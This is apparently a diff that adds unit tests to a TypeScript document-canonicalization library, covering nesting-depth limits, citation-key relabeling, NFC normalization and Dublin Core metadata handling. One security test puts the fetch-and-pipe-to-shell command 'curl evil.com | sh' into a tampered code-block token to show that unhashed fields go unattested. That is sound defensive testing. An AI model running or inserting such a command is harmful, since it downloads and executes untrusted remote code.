@@ -14,12 +14,20 @@ import * as fs from 'fs';
 import * as path from 'path';
 import {
   CanonicalizationError,
+  MAX_CANONICALIZATION_DEPTH,
   algorithmOf,
   canonicalContent,
   computeDocumentId,
   parseStrictJson,
   type DocumentParts,
 } from './lib/canonicalize.js';
+
+/** Wrap a value in `depth` nested arrays (each array is one container level). */
+function nestArrays(depth: number): unknown {
+  let v: unknown = 'x';
+  for (let i = 0; i < depth; i++) v = [v];
+  return v;
+}
 
 let passed = 0;
 let failed = 0;
@@ -214,6 +222,30 @@ test('strip: codeBlock.tokens removed, highlighting mode preserved', () => {
   assert.equal('tokens' in blocks[0], false);
   assert.equal(blocks[0].highlighting, 'tokens');
   assert.deepEqual(blocks[0].children, [{ type: 'text', value: 'const x = 1' }]);
+});
+
+test('id: derived display/tokens do not affect the document id (out-of-hash, unattested)', () => {
+  // Two documents whose ONLY difference is the derived, out-of-hash fields an
+  // attacker would tamper (measurement.display, codeBlock.tokens): a benign copy vs.
+  // a malicious one over identical hashed source. Identical document ids prove a
+  // signature attests neither, so a renderer must regenerate from the hashed source
+  // (measurement value/unit; code-block children) and never trust the stored copy.
+  const doc = (display: string, tokenValue: string) => ({
+    version: '0.1',
+    blocks: [
+      { type: 'measurement', value: 7.677, unit: 'mm', display },
+      {
+        type: 'codeBlock',
+        language: 'sh',
+        highlighting: 'tokens',
+        tokens: [{ type: 'plain', value: tokenValue }],
+        children: [{ type: 'text', value: 'echo hi' }],
+      },
+    ],
+  });
+  const benign = makeParts({ content: doc('7.677 mm', 'echo hi') });
+  const tampered = makeParts({ content: doc('9999 mm', 'curl evil.com | sh') });
+  assert.equal(computeDocumentId(benign, 'sha256'), computeDocumentId(tampered, 'sha256'));
 });
 
 test('strip: crdt removed from a block', () => {
@@ -652,7 +684,7 @@ test('e2e: simple-document canonicalizes to a stable id', () => {
 });
 
 // ---------------------------------------------------------------------------
-// Reviewer-driven hardening: determinism seams + regression guards
+// Determinism seams + regression guards
 // ---------------------------------------------------------------------------
 
 test('marks: sort uses UTF-16 code-unit order (astral mark sorts before a U+FFFF mark)', () => {
@@ -991,6 +1023,62 @@ test('relabel: a signature signer.id is a Person id (named sub-object), not rela
   assert.equal(blocks[1].signer.id, 'intro'); // signer id → verbatim, no collision error
 });
 
+test('relabel: a bibliography entry key (separate namespace) is not relabeled, even when it equals a block id', () => {
+  // A semantic:bibliography inline entry carries a string id (CSL citation key) AND a
+  // string type (CSL type), so a shape heuristic mistakes it for a block. Its id is a
+  // separate namespace: it must stay verbatim, and it must NOT count as a duplicate of
+  // a block that happens to share the label.
+  const blocks = canonContent({
+    content: {
+      version: '0.1',
+      blocks: [
+        { type: 'heading', id: 'smith2024', level: 1, children: [{ type: 'text', value: 'H' }] },
+        { type: 'semantic:bibliography', id: 'bib', entries: [{ id: 'smith2024', type: 'article-journal', title: 'A' }] },
+      ],
+    },
+  }).blocks;
+  assert.equal(blocks[0].id, 'b0'); // heading block id → relabeled
+  assert.equal(blocks[1].id, 'b1'); // bibliography block id → relabeled
+  assert.equal(blocks[1].entries[0].id, 'smith2024'); // entry key → verbatim, no false duplicate
+});
+
+test('id: changing only a bibliography entry key (citation ref unchanged) changes the id (collision closed)', () => {
+  // The malleability the fix closes: under the old heuristic the entry key was
+  // relabeled to bN while the citation ref stayed on the authored key, so changing the
+  // key produced the SAME document id — collapsing two different bibliographies onto one
+  // identity. The key is now hashed verbatim, so the two documents have distinct ids.
+  const doc = (key: string) => ({
+    version: '0.1',
+    blocks: [
+      { type: 'paragraph', children: [{ type: 'text', value: 'x', marks: [{ type: 'citation', refs: ['smith2024'] }] }] },
+      { type: 'semantic:bibliography', id: 'bib', entries: [{ id: key, type: 'article-journal' }] },
+    ],
+  });
+  assert.notEqual(
+    computeDocumentId(makeParts({ content: doc('smith2024') }), 'sha256'),
+    computeDocumentId(makeParts({ content: doc('smith2099') }), 'sha256'),
+  );
+});
+
+test('relabel: an id in an extension block\'s own data array (not `lines`/`subfigures`) is not relabeled', () => {
+  // An unknown namespaced block (open escape) carries an id-bearing object in an
+  // `items` array. Only `lines`/`subfigures` array-item ids join the relabeled
+  // namespace, so the nested id stays verbatim — a future extension's separate
+  // namespace is not swept in merely because a node has an id and sits in an array.
+  const blocks = canonContent({
+    content: {
+      version: '0.1',
+      blocks: [
+        { type: 'heading', id: 'h', level: 2, children: [{ type: 'text', value: 'X' }] },
+        { type: 'x:widget', id: 'w', items: [{ id: 'k', label: 'L' }] },
+      ],
+    },
+  }).blocks;
+  assert.equal(blocks[0].id, 'b0'); // heading block id → relabeled
+  assert.equal(blocks[1].id, 'b1'); // extension block id → relabeled
+  assert.equal(blocks[1].items[0].id, 'k'); // untyped id in a non-sub-block array → verbatim
+});
+
 test('relabel: a duplicate id in the shared identifier namespace is rejected', () => {
   assert.throws(
     () =>
@@ -1106,6 +1194,110 @@ test('purity: alpha-equivalence holds across a text-node id boundary and merge',
       },
     });
   assert.equal(computeDocumentId(mk('w'), 'sha256'), computeDocumentId(mk('other'), 'sha256'));
+});
+
+test('resource bounds: content nested past MAX_CANONICALIZATION_DEPTH throws a typed error, not a RangeError', () => {
+  const parts = makeParts({ content: nestArrays(MAX_CANONICALIZATION_DEPTH + 1) });
+  // Must be the module's typed error (a verifier catching only this must not crash),
+  // never an untyped RangeError from a native stack overflow.
+  assert.throws(() => computeDocumentId(parts, 'sha256'), CanonicalizationError);
+  try {
+    computeDocumentId(parts, 'sha256');
+  } catch (err) {
+    assert.ok(!(err instanceof RangeError), 'must not surface an untyped RangeError');
+    assert.match((err as Error).message, /nesting exceeds the maximum depth/);
+  }
+});
+
+test('resource bounds: content nested exactly to MAX_CANONICALIZATION_DEPTH still canonicalizes', () => {
+  const parts = makeParts({ content: nestArrays(MAX_CANONICALIZATION_DEPTH) });
+  const id = computeDocumentId(parts, 'sha256');
+  assert.match(id, /^sha256:[a-f0-9]{64}$/);
+});
+
+test('resource bounds: deeply nested Dublin Core metadata throws a typed error, not a RangeError', () => {
+  // projectMetadata copies term arrays by reference, so a deep Dublin Core term
+  // reaches validateStoredByteInvariants/jcsOf verbatim — the metadata walk path
+  // must be guarded too, not just the content path.
+  const parts = makeParts({
+    content: { version: '0.1', blocks: [] },
+    dublinCore: { version: '1.1', terms: { title: 'T', creator: nestArrays(MAX_CANONICALIZATION_DEPTH + 1) } },
+  });
+  assert.throws(() => computeDocumentId(parts, 'sha256'), CanonicalizationError);
+  try {
+    computeDocumentId(parts, 'sha256');
+  } catch (err) {
+    assert.ok(!(err instanceof RangeError), 'must not surface an untyped RangeError');
+  }
+});
+
+test('block-level NFC: a combining sequence split across text-node boundaries is rejected', () => {
+  // Two text nodes with different marks are not merged; each value is individually
+  // NFC ('cafe' and a lone U+0301), but the concatenation 'café' is NFD.
+  const split = makeParts({
+    content: {
+      version: '0.1',
+      blocks: [{ type: 'paragraph', children: [
+        { type: 'text', value: 'cafe', marks: ['bold'] },
+        { type: 'text', value: '́', marks: ['italic'] },
+      ] }],
+    },
+  });
+  assert.throws(() => computeDocumentId(split, 'sha256'), CanonicalizationError);
+  try {
+    computeDocumentId(split, 'sha256');
+  } catch (err) {
+    assert.match((err as Error).message, /combining sequence is split|not in NFC/);
+  }
+});
+
+test('block-level NFC: an NFC split across text-node boundaries still canonicalizes', () => {
+  // 'caf' + precomposed 'é' — the split is NFC, so it is accepted (only a split
+  // that BREAKS NFC is rejected).
+  const nfcSplit = makeParts({
+    content: {
+      version: '0.1',
+      blocks: [{ type: 'paragraph', children: [
+        { type: 'text', value: 'caf', marks: ['bold'] },
+        { type: 'text', value: 'é', marks: ['italic'] },
+      ] }],
+    },
+  });
+  assert.match(computeDocumentId(nfcSplit, 'sha256'), /^sha256:[a-f0-9]{64}$/);
+});
+
+test('metadata projection: empty array elements are dropped (id is the same with or without empties)', () => {
+  const withEmpties = makeParts({
+    content: { version: '0.1', blocks: [] },
+    dublinCore: { version: '1.1', terms: { title: 'T', creator: ['Alice', '', 'Bob'], subject: ['', 'Fin'] } },
+  });
+  const without = makeParts({
+    content: { version: '0.1', blocks: [] },
+    dublinCore: { version: '1.1', terms: { title: 'T', creator: ['Alice', 'Bob'], subject: ['Fin'] } },
+  });
+  assert.equal(computeDocumentId(withEmpties, 'sha256'), computeDocumentId(without, 'sha256'));
+});
+
+test('metadata projection: a malformed Dublin Core term is rejected, not silently dropped', () => {
+  // A non-string title would previously drop silently, colliding with an absent title.
+  const parts = makeParts({
+    content: { version: '0.1', blocks: [] },
+    dublinCore: { version: '1.1', terms: { title: 123, creator: 'C' } },
+  });
+  assert.throws(() => computeDocumentId(parts, 'sha256'), CanonicalizationError);
+});
+
+test('metadata projection: a non-string array element in a term is rejected', () => {
+  const parts = makeParts({
+    content: { version: '0.1', blocks: [] },
+    dublinCore: { version: '1.1', terms: { title: 'T', creator: ['A', 42] } },
+  });
+  assert.throws(() => computeDocumentId(parts, 'sha256'), CanonicalizationError);
+});
+
+test('numbers: an integer beyond the 2^53-1 safe range is rejected as a canonicalization error', () => {
+  const parts = makeParts({ content: { version: '0.1', blocks: [], bignum: 9007199254740993 } });
+  assert.throws(() => computeDocumentId(parts, 'sha256'), CanonicalizationError);
 });
 
 console.log(`\n${passed} passed, ${failed} failed`);
